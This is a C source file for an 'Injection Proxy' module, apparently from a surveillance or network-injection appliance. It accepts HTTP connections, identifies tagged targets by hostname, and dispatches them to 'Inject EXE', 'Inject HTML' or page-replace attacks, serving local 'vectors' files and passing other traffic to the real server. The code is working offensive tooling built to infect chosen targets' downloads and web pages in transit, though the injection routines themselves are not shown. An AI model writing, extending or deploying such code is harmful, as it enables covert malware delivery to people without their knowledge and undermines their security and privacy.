/*
    MODULE -- proxy module (handles the tagged connections)

    Copyright (C) Alberto Ornaghi

    $Id: proxy.c 3558 2011-06-07 10:59:30Z alor $
*/

#include <main.h>
#include <proxy.h>
#include <threads.h>
#include <file.h>
#include <match.h>
#include <timer.h>
#include <match_request.h>
#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <signal.h>

/* globals */

/* protos */

void proxy_start(void);
MY_THREAD_FUNC(proxy);
MY_THREAD_FUNC(handle_connection);
void mangle_request(char *request, char *request_end);
int remote_BIOseek(const char *host, const char *resource, size_t offset, BIO **sbio, char *request);

/************************************************/

void proxy_start(void)
{
   /* check when to not initialize the proxy */
   if (GBL_OPTIONS->read) {
      DEBUG_MSG(D_INFO, "proxy_start: skipping... (reading offline)");
      return;
   }

   my_thread_new("proxy", "Injection Proxy", &proxy, NULL);
}

MY_THREAD_FUNC(proxy)
{
   BIO *abio = NULL;
   BIO *cbio = NULL; // client bio

   /* initialize the thread */
   my_thread_init();

   /* the listening socket */
   abio = BIO_new_accept("0.0.0.0:" PROXY_PORT);

   /* reuse the address */
   BIO_set_bind_mode(abio, BIO_BIND_REUSEADDR);

   /* First call to BIO_accept() sets up accept BIO */
   if (BIO_do_accept(abio) <= 0)
      ERROR_MSG("Cannot bind port %s for injection proxy", PROXY_PORT);

   DEBUG_MSG(D_INFO, "Injection Proxy listening on port %s", PROXY_PORT);

   LOOP {

      /* Wait for incoming connection */
      if (BIO_do_accept(abio) <= 0) {
         DEBUG_MSG(D_ERROR, "Cannot perform BIO_do_accept");
         continue;
      }

      /* Retrieve BIO for connection */
      cbio = BIO_pop(abio);

      /* create the thread that will handle the connection */
      my_thread_new("proxy", "Injection Proxy", &handle_connection, cbio);

   }

   BIO_free(abio);

   /* NEVER REACHED */
   return NULL;
}

MY_THREAD_FUNC(handle_connection)
{
   BIO *cbio = MY_THREAD_PARAM; // client bio
   BIO *sbio = NULL; // server bio
   struct sockaddr_in peer;
   int sock;
   socklen_t slen;
   char request[HTTP_HEADER_LEN];
   char data[READ_BUFF_SIZE];
   char *request_end = NULL;
   int len, written;
   char *host, *tag, *th = NULL;
   char *url = NULL;
   char *p, *q;
   struct request_node *req;
   struct timeval tvs, tve, tvt;

   gettimeofday(&tvs, NULL);

   /* initialize the thread */
   my_thread_init();

   /* retrieve the socket information */
   BIO_get_fd(cbio, &sock);
   slen = sizeof(peer);
   getpeername(sock, (struct sockaddr *)&peer, &slen);

   DEBUG_MSG(D_INFO, "Handling incoming connection [%d][%s]", sock, inet_ntoa(peer.sin_addr));

   memset(request, 0, sizeof(request));
   written = 0;

   /* read the HTTP request from the client */
   do {

      len = BIO_read(cbio, request + written, sizeof(request) - written);
      if (len <= 0)
         break;

      written += len;

   } while (!strstr(request, CR LF CR LF) && !strstr(request, LF LF));

   /* find the request end */
   request_end = request + strlen(request);

   /* retrieve the host tag */
   host = strcasestr(request, HTTP_HOST_TAG);

   DEBUG_MSG(D_EXCESSIVE, "client request:\n%s", request);

   if (host == NULL)
      goto close_connection;

   /*
    * extract the hostname of the server the client wants to connect to.
    * we will use this hostname for two purposes:
    *   - the first part is the identifier of the target
    *   - the second part is the real host for the connection
    * if the tag is not present in the list, proxy the connection as it is (no modifications)
    */
   SAFE_STRDUP(th, host + strlen(HTTP_HOST_TAG));

   /* trim the eol */
   if ((p = strchr(th, '\r')) != NULL)
      *p = 0;
   if ((p = strchr(th, '\n')) != NULL)
      *p = 0;

   /* the tag is the first part */
   tag = th;
   if ((p = strchr(th, '.')) != NULL)
      *p = 0;

   /* then we have the host */
   host = p + 1;
   if ((p = strchr(host, '\r')) != NULL || (p = strchr(host, '\n')) != NULL)
      *p = 0;

   /* extract the requested  url */
   if ((p = strchr(request, ' ')) != NULL)
      if ((q = strchr(p + 1, ' ')) != NULL) {
         SAFE_CALLOC(url, strlen(host) + (q - p) + 1, sizeof(char));
         strcpy(url, host);
         memcpy(url + strlen(url), p + 1, q - p - 1);
         DEBUG_MSG(D_DEBUG, "URL: [%s]", url);
      }

   /*
    * search the tag in the list.
    *    - if we found it, we know how to infect the target
    *    - if not found, do nothing and simply proxy the connection
    */
   if ((req = request_find(tag, url)) != NULL) {
      DEBUG_MSG(D_INFO, "Connection from target [%s][%s], preparing the attack...", tag, url);

      switch (req->type) {
         case REQ_TYPE_INJECT_EXE:
            DEBUG_MSG(D_INFO, "Inject EXE attack");
            /* create the header we will send to the real server */
            mangle_request(request, request_end);

            /* perform the connection (with injection) */
            proxy_inject_exe(&cbio, &sbio, request, req->path);
            break;

         case REQ_TYPE_INJECT_HTML:
            DEBUG_MSG(D_INFO, "Inject HTML attack");
            /* create the header we will send to the real server */
            mangle_request(request, request_end);

            /* perform the connection (with injection) */
            proxy_inject_html(&cbio, &sbio, request, req->path, req->tag);
            break;

         case REQ_TYPE_REPLACE:
            DEBUG_MSG(D_INFO, "Replace attack");
            /* replace the page with a local one */
            proxy_replace(&cbio, &sbio, req->path, req->tag, host);
            break;
      }

   } else if ((req = request_find_tag(tag)) != NULL) {
      FILE *lf;
      char *p;

      DEBUG_MSG(D_ERROR, "Tag found [%s], proxying the connection to [%s]...", tag, url);
      /*
       * no request was matched, but a tag was found
       * we have to remove it and proxy the connection
       */
      mangle_request(request, request_end);

      /* check if the file is local to "vectors"
       * if it is present, serve it and don't ask to the real server
       */
      if ((p = strrchr(url, '/')) != NULL) {
         /* check if the client is requesting a file */
         if (strlen(p + 1) &&             /* the filename has a length */
             !strpbrk(p + 1, "&?%=") &&   /* the file is not a for request/post */
             ((lf = open_data("vectors", p + 1, FOPEN_READ_BIN)) != NULL)) {
            DEBUG_MSG(D_INFO, "Serving local file: [%s]", p + 1);
            /* read from the file */
            proxy_replace(&cbio, &sbio, p + 1, req->tag, host);
            /* close the handle */
            fclose(lf);
         } else {
            /* the file is not local, proxy the connection to the real server */
            proxy_null(&cbio, &sbio, request);
         }
      } else {
         /* the file is not local, proxy the connection to the real server */
         proxy_null(&cbio, &sbio, request);
      }
   } else {
      DEBUG_MSG(D_ERROR, "No known tag found, terminating the connection... [%s]", url);
      /*
       * perform the connection (without injection)
       * the header here is the original one
       */
      //proxy_null(&cbio, &sbio, header);

      /* prevent the use of IPA as open proxy */
      goto close_connection;
   }

   /* check that everything was set up correctly */
   if (sbio && cbio) {
      int total = 0;
      /*
       * read the data from the server and write them to the client.
       * the correct sbio and cbio were set right above.
       */
      LOOP {
         len = BIO_read(sbio, data, READ_BUFF_SIZE);
         if (len <= 0) {
            DEBUG_MSG(D_EXCESSIVE, ERR_error_string(ERR_get_error(), NULL));
            break;
         }

         total += len;
         //DEBUG_MSG(D_DEBUG, "Read %d bytes, total %08x (sbio EOF: %s).", len, total, (BIO_eof(sbio) == 1 ? "yes" : "no" ));

         len = BIO_write(cbio, data, len);
         if (len < 0) {
            DEBUG_MSG(D_EXCESSIVE, ERR_error_string(ERR_get_error(), NULL));
            break;
         }
         //DEBUG_MSG(D_DEBUG, "Written %d bytes.", len);
      }

      DEBUG_MSG(D_DEBUG, "Flushing the connection...");

      (void) BIO_flush(cbio);
   }

close_connection:

   gettimeofday(&tve, NULL);
   tvt = timeval_subtract(&tve, &tvs);

   /* free the memory */
   SAFE_FREE(th);
   SAFE_FREE(url);

   DEBUG_MSG(D_INFO, "End connection [%d] [%d.%d seconds]", BIO_get_fd(cbio, NULL), tvt.tv_sec, tvt.tv_usec);

   /* Close the established connection */
   BIO_free(sbio);
   BIO_free_all(cbio);

   my_thread_exit();

   return NULL;
}


void mangle_request(char *request, char *request_end)
{
   char *begin, *q, *p;
   int i;

   /* search the beginning of the host tag and skip it */
   begin = strcasestr(request, HTTP_HOST_TAG);
   begin += strlen(HTTP_HOST_TAG);

   /* skip the tag */
   q = strchr(begin, '.') + 1;

   /* check if it was a plain ip address (mangled by match_url.c)
    * in this case we have:
    *    in-addr-jjj-yyy-zzz-kkk.net
    * we have to translate it to:
    *    jjj.yyy.zzz.kkk
    */
   if (!memcmp(q, IP_IDENT_PREFIX, strlen(IP_IDENT_PREFIX))) {
      /* skip the IP_IDENT tag */
      q += strlen(IP_IDENT_PREFIX);
      /* replace the fake ip with the real one (substitute the '-' with '.') */
      for (i = 0; *(q + i) != '.'; i++)
         if (*(q + i) == '-')
            *(q + i) = '.';

      /* find the last .net suffix */
      p = strchr(q + i, '.');

      /* remove the .net */
      if (p)
         memmove(p, p + strlen(IP_IDENT_SUFFIX), request_end + 1 - (p + strlen(IP_IDENT_SUFFIX)));
   }

   /* move the rest of the header over the tag */
   memmove(begin, q, request_end + 1 - q);
}


int remote_BIOseek(const char *host, const char *resource, size_t offset, BIO **sbio, char *request)
{
   char get_header[4096];
   char data[READ_BUFF_SIZE];
   int len, written;

   /* connect to the server */
   *sbio = BIO_new(BIO_s_connect());
   BIO_set_conn_hostname(*sbio, host);
   BIO_set_conn_port(*sbio, "http");

   if (BIO_do_connect(*sbio) <= 0) {
      DEBUG_MSG(D_ERROR, "Cannot connect to [%s]", host);
      return -ENOADDRESS;
   }

   memset(get_header, 0, sizeof(get_header));

   /* prepare the request */
   snprintf(get_header, sizeof(get_header)-1,
         "GET %s HTTP/1.1\r\n"
         "Accept: */*\r\n"
         "Range: bytes=%u-\r\n"
         "Host: %s\r\n"
         "Connection: close\r\n"
         "Cache-Control: no-cache\r\n"
         "\r\n", resource, (u_int)offset, host);

   DEBUG_MSG(D_VERBOSE, "REQUEST: [%s]", get_header);

   /* send the request */
   BIO_write(*sbio, get_header, strlen(get_header));

   /* if the caller does not supply an header buffer, use the internal one */
   if (request == NULL)
      request = data;

   written = 0;

   /* read the reply header from the server */
   LOOP {
      len = BIO_read(*sbio, request + written, sizeof(char));
      if (len <= 0)
         break;

      written += len;
      if (strstr(request, CR LF CR LF) || strstr(request, LF LF))
         break;
   }

   DEBUG_MSG(D_VERBOSE, "REPLY: [%s]", request);

   /* check if the server is happy with our request */
   if (!strcasestr(request, "HTTP/1.1 206 Partial Content")) {
      return -EINVALID;
   }

   return ESUCCESS;
}

/* EOF */

// vim:ts=3:expandtab

